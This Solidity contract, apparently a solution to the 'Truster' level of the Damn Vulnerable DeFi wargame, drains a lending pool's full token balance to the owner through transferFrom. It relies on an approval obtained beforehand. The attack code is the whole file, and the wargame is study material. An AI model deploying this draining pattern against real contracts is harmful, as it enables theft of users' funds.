// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract TrusterAttacker is Ownable {
    TrusterLenderPool public pool;
    IERC20 public damnValuableToken;

    constructor(address poolAddress, address tokenAddress) {
        pool = TrusterLenderPool(poolAddress);
        damnValuableToken = IERC20(tokenAddress);
    }

    function withDraw() external onlyOwner {
        uint256 poolTokenBalance = damnValuableToken.balanceOf(address(pool));
        damnValuableToken.transferFrom(
            address(pool),
            this.owner(),
            poolTokenBalance
        );
    }
}
